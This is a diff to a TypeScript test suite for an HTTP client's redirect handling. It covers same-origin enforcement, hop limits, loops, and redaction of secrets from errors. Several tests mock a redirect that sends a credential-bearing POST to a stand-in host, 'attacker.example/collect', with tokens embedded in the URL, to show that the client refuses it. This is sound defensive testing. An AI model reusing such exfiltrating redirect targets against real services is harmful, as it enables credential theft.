@@ -1,6 +1,6 @@
 import { afterAll, beforeEach, describe, expect, it, mock } from "bun:test";
 
-import { TransportError } from "../errors.js";
+import { HttpRedirectError, TransportError } from "../errors.js";
 import {
 	HttpRetryAfterPolicy,
 	HttpRetryJitter,
@@ -28,6 +28,24 @@ const mockNativeFetchState = {
 };
 
 const originalFetch = globalThis.fetch;
+
+function stringifyDiagnosticGraph(value: unknown): string {
+	const seen = new WeakSet<object>();
+	const snapshot = (current: unknown): unknown => {
+		if (current === null || (typeof current !== "object" && typeof current !== "function")) {
+			return current;
+		}
+		if (seen.has(current)) return "[cycle]";
+		seen.add(current);
+		const output: Record<string, unknown> = {};
+		for (const name of Object.getOwnPropertyNames(current)) {
+			const descriptor = Object.getOwnPropertyDescriptor(current, name);
+			output[name] = descriptor && "value" in descriptor ? snapshot(descriptor.value) : "[accessor]";
+		}
+		return output;
+	};
+	return JSON.stringify(snapshot(value));
+}
 
 describe("createHttpClient", () => {
 	beforeEach(() => {
@@ -230,6 +248,287 @@ describe("createHttpClient", () => {
 		expect(mockNativeFetchState.calls[0]?.init?.body).toBe(JSON.stringify({ key: "value" }));
 		expect(result.data).toEqual({ json: { key: "value" } });
 		expect(await result.text()).toBe(JSON.stringify({ json: { key: "value" } }));
+	});
+
+	it("blocks a cross-origin 307 before a credential-bearing POST is issued", async () => {
+		const calls: MockNativeFetchCall[] = [];
+		const diagnosticSecret = "cross-origin-diagnostic-secret";
+		const redirectTarget = `https://alice:${diagnosticSecret}@attacker.example/collect?token=${diagnosticSecret}#${diagnosticSecret}`;
+		globalThis.fetch = mock(async (input: string | URL | Request, init?: RequestInit) => {
+			const url = String(input);
+			calls.push({ url, init });
+			if (url === "https://api.example.com/login") {
+				if (init?.redirect === "manual") {
+					return new Response(null, {
+						headers: { location: redirectTarget },
+						status: 307,
+					});
+				}
+				// Model native fetch's default redirect following. If production stops
+				// forcing manual mode, this mock actually carries the POST to the target.
+				return globalThis.fetch(redirectTarget, init);
+			}
+			return new Response("stolen", { status: 200 });
+		}) as typeof fetch;
+
+		const { createHttpClient } = await import("../runtime/http.js");
+		const http = createHttpClient();
+		let caught: unknown;
+		try {
+			await http.post(
+				"https://api.example.com/login",
+				{ username: "alice", password: "credential" },
+				{ redirectPolicy: { mode: "same-origin", maxHops: 5 } },
+			);
+		} catch (error) {
+			caught = error;
+		}
+
+		// This is the security property: the refused target was never requested.
+		expect(calls).toHaveLength(1);
+		expect(caught).toBeInstanceOf(HttpRedirectError);
+		expect(caught).toMatchObject({
+			code: "http_redirect_stopped",
+			reason: "stopped",
+			target: "https://attacker.example/collect?[REDACTED]",
+		});
+		expect(String((caught as Error).message)).toContain("https://attacker.example/collect");
+		expect(stringifyDiagnosticGraph(caught)).not.toContain(diagnosticSecret);
+		expect(calls[0]?.init).toMatchObject({
+			body: JSON.stringify({ username: "alice", password: "credential" }),
+			method: "POST",
+			redirect: "manual",
+		});
+	});
+
+	it("cancels an unbounded redirect body and still refuses the target promptly", async () => {
+		let cancelled = false;
+		const calls: MockNativeFetchCall[] = [];
+		globalThis.fetch = mock(async (input: string | URL | Request, init?: RequestInit) => {
+			calls.push({ url: String(input), init });
+			return new Response(
+				new ReadableStream<Uint8Array>({
+					pull: () => new Promise<void>(() => undefined),
+					cancel() {
+						cancelled = true;
+						return new Promise<void>(() => undefined);
+					},
+				}),
+				{
+					headers: { location: "https://other.example/never-read" },
+					status: 307,
+				},
+			);
+		}) as typeof fetch;
+
+		const { createHttpClient } = await import("../runtime/http.js");
+		const outcome = await Promise.race([
+			createHttpClient()
+				.get("https://example.com/start", {
+					redirectPolicy: { mode: "same-origin", maxHops: 2 },
+				})
+				.catch((error: unknown) => error),
+			new Promise<"timed_out">((resolve) => setTimeout(() => resolve("timed_out"), 100)),
+		]);
+
+		expect(outcome).toBeInstanceOf(HttpRedirectError);
+		expect(outcome).toMatchObject({ code: "http_redirect_stopped", reason: "stopped" });
+		expect(cancelled).toBeTrue();
+		expect(calls).toHaveLength(1);
+	});
+
+	it("follows legitimate same-origin redirects and applies fetch method/body semantics", async () => {
+		const rewrittenRedirect = new Response("ignored redirect body", {
+			headers: { location: "/after-post" },
+			status: 302,
+		});
+		const preservedRedirect = new Response("ignored redirect body", {
+			headers: { location: "https://example.com:443/retry" },
+			status: 307,
+		});
+		mockNativeFetchState.queuedNativeResponses.push(
+			rewrittenRedirect,
+			new Response("done", { headers: { "content-type": "text/plain" }, status: 200 }),
+			preservedRedirect,
+			new Response("preserved", {
+				headers: { "content-type": "text/plain" },
+				status: 200,
+			}),
+		);
+
+		const { createHttpClient } = await import("../runtime/http.js");
+		const http = createHttpClient();
+		const policy = { mode: "same-origin", maxHops: 2 } as const;
+		await http.post("https://example.com/start", { credential: "secret" }, {
+			redirectPolicy: policy,
+		});
+		await http.post("https://example.com/preserve", "credential=secret", {
+			headers: { "Content-Type": "application/x-www-form-urlencoded" },
+			redirectPolicy: policy,
+		});
+
+		expect(mockNativeFetchState.calls).toHaveLength(4);
+		expect(mockNativeFetchState.calls[1]).toMatchObject({
+			url: "https://example.com/after-post",
+			init: { method: "GET", redirect: "manual" },
+		});
+		expect(mockNativeFetchState.calls[1]?.init?.body).toBeUndefined();
+		expect(new Headers(mockNativeFetchState.calls[1]?.init?.headers).has("content-type")).toBeFalse();
+		expect(rewrittenRedirect.bodyUsed).toBeTrue();
+		expect(mockNativeFetchState.calls[3]).toMatchObject({
+			url: "https://example.com/retry",
+			init: {
+				body: "credential=secret",
+				method: "POST",
+				redirect: "manual",
+			},
+		});
+		expect(preservedRedirect.bodyUsed).toBeTrue();
+	});
+
+	it("uses GET without a body after 303, while 308 preserves PUT bodies", async () => {
+		mockNativeFetchState.queuedResponses.push(
+			{ status: 303, body: "", headers: { location: "/get-result" } },
+			{ status: 200, body: "ok", headers: {} },
+			{ status: 308, body: "", headers: { location: "/put-again" } },
+			{ status: 200, body: "ok", headers: {} },
+		);
+		const { createHttpClient } = await import("../runtime/http.js");
+		const http = createHttpClient("https://example.com");
+		const policy = { mode: "same-origin", maxHops: 1 } as const;
+
+		await http.request("/submit", {
+			body: "credential",
+			method: "PATCH",
+			redirectPolicy: policy,
+		});
+		await http.put("/update", "credential", { redirectPolicy: policy });
+
+		expect(mockNativeFetchState.calls[1]?.init).toMatchObject({
+			method: "GET",
+			redirect: "manual",
+		});
+		expect(mockNativeFetchState.calls[1]?.init?.body).toBeUndefined();
+		expect(mockNativeFetchState.calls[3]?.init).toMatchObject({
+			body: "credential",
+			method: "PUT",
+			redirect: "manual",
+		});
+	});
+
+	it("fails closed with aligned reasons for missing/malformed Location, limits, and loops", async () => {
+		const { createHttpClient } = await import("../runtime/http.js");
+		const http = createHttpClient("https://example.com");
+		const policy = { mode: "same-origin", maxHops: 1 } as const;
+
+		mockNativeFetchState.queuedResponses.push({ status: 302, body: "", headers: {} });
+		await expect(http.get("/missing", { redirectPolicy: policy })).rejects.toMatchObject({
+			code: "http_redirect_missing_location",
+			reason: "missing_location",
+		});
+
+		const malformedSecret = "malformed-location-secret";
+		const malformedRedirect = new Response("must be discarded", {
+			headers: {
+				location: `https://${malformedSecret}@[attacker.example/collect`,
+			},
+			status: 302,
+		});
+		mockNativeFetchState.queuedNativeResponses.push(malformedRedirect);
+		let malformedError: unknown;
+		try {
+			await http.get("/malformed", { redirectPolicy: policy });
+		} catch (error) {
+			malformedError = error;
+		}
+		expect(malformedError).toMatchObject({
+			code: "http_redirect_missing_location",
+			reason: "missing_location",
+		});
+		expect((malformedError as HttpRedirectError).target).toBe("[malformed redirect target]");
+		expect((malformedError as Error & { cause?: unknown }).cause).toBeUndefined();
+		expect(stringifyDiagnosticGraph(malformedError)).not.toContain(malformedSecret);
+		expect(malformedRedirect.bodyUsed).toBeTrue();
+
+		mockNativeFetchState.queuedResponses.push(
+			{ status: 302, body: "", headers: { location: "/limit-two" } },
+			{ status: 302, body: "", headers: { location: "/limit-three" } },
+		);
+		await expect(http.get("/limit-one", { redirectPolicy: policy })).rejects.toMatchObject({
+			code: "http_redirect_max_hops",
+			reason: "max_hops",
+			target: "https://example.com/limit-three",
+		});
+
+		mockNativeFetchState.queuedResponses.push(
+			{ status: 302, body: "", headers: { location: "/loop-two" } },
+			{ status: 302, body: "", headers: { location: "/loop-one" } },
+		);
+		await expect(
+			http.get("/loop-one", {
+				redirectPolicy: { mode: "same-origin", maxHops: 2 },
+			}),
+		).rejects.toMatchObject({
+			code: "http_redirect_loop",
+			reason: "loop",
+			target: "https://example.com/loop-one",
+		});
+		expect(mockNativeFetchState.calls).toHaveLength(6);
+	});
+
+	it("validates and snapshots redirectPolicy before any transport work", async () => {
+		const { createHttpClient } = await import("../runtime/http.js");
+		const http = createHttpClient();
+		const invalidPolicies: unknown[] = [
+			null,
+			{},
+			{ mode: "follow", maxHops: 1 },
+			{ mode: "same-origin", maxHops: -1 },
+			{ mode: "same-origin", maxHops: 21 },
+			{ mode: "same-origin", maxHops: 1, surprise: true },
+		];
+
+		for (const redirectPolicy of invalidPolicies) {
+			await expect(
+				http.get("https://example.com", { redirectPolicy } as never),
+			).rejects.toMatchObject({ code: "http_redirect_policy_invalid" });
+		}
+		const accessorPolicy = {} as Record<string, unknown>;
+		Object.defineProperty(accessorPolicy, "mode", {
+			get() {
+				throw new Error("getter must not run");
+			},
+			enumerable: true,
+		});
+		Object.defineProperty(accessorPolicy, "maxHops", { value: 1, enumerable: true });
+		await expect(
+			http.get("https://example.com", { redirectPolicy: accessorPolicy } as never),
+		).rejects.toMatchObject({ code: "http_redirect_policy_invalid" });
+		expect(mockNativeFetchState.calls).toHaveLength(0);
+	});
+
+	it("enforces redirectPolicy for streaming requests before opening the target stream", async () => {
+		mockNativeFetchState.queuedResponses.push({
+			status: 307,
+			body: "",
+			headers: { location: "https://other.example/events" },
+		});
+		const { createHttpClient } = await import("../runtime/http.js");
+		await expect(
+			createHttpClient().stream("https://example.com/events", {
+				redirectPolicy: { mode: "same-origin", maxHops: 2 },
+			}),
+		).rejects.toMatchObject({ code: "http_redirect_stopped", reason: "stopped" });
+		expect(mockNativeFetchState.calls).toHaveLength(1);
+	});
+
+	it("preserves native fetch redirect behavior when redirectPolicy is absent", async () => {
+		mockNativeFetchState.queuedResponses.push({ status: 200, body: "followed", headers: {} });
+		const { createHttpClient } = await import("../runtime/http.js");
+		const response = await createHttpClient().get("https://example.com/legacy");
+
+		expect(await response.text()).toBe("followed");
+		expect(mockNativeFetchState.calls[0]?.init).not.toHaveProperty("redirect");
 	});
 
 	it("stream() exposes native response body without eager text buffering", async () => {
